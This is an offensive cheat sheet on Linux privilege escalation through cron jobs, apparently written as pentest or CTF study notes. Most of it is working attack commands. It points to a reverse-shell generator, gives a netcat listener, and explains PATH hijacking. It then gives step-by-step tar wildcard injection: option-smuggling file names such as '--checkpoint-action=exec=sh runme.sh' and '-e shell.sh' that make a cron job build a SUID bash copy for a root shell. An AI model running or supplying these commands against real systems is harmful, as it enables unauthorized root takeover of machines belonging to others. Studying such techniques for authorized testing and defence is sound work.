# Cronjobs

## Program to use: pspy https://github.com/DominicBreuker/pspy

### 

    cat /etc/crontab

#### If we have write permissions on the script, we can modify it to enter a reverse shell in it that will automatically run as root.

### Reverse shell source:  Revshells https://revshells.com/

#### Open a listener then wait. 

#### Example: 

    nc -lvnp PORT

### If the full path of the script is not defined in the cronjob, then we can create our own script with the same name and run based on the PATH variables in the /etc/crontab file.

### We can also abuse wildcards for certain cronjobs to gain root.

## Wildcard Injection example:

### If a cronjob contains a wildcard utilizing tar we can do:

#### 1) 

    echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > runme.sh

#### 2) 

    chmod +x runme.sh

#### 3) 

    echo "" > --checkpoint=1

#### 4) 

    echo "" > --checkpoint-action=exec=sh runme.sh

#### 5) 

    /tmp/bash -p

### Note: Do the injection in the correct directory the automated script goes to so that it can actually run the injected commands via tar

## Generic wildcard injection

### Example:

### If you detect a cronjob/script that uses wildcard, chances are that it is vulnerable to wildcard injection.

### 1) 

    echo "cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash" > shell.sh

### 2) 

    chmod +x shell.sh

### 3) 

    touch -- '-e shell.sh'



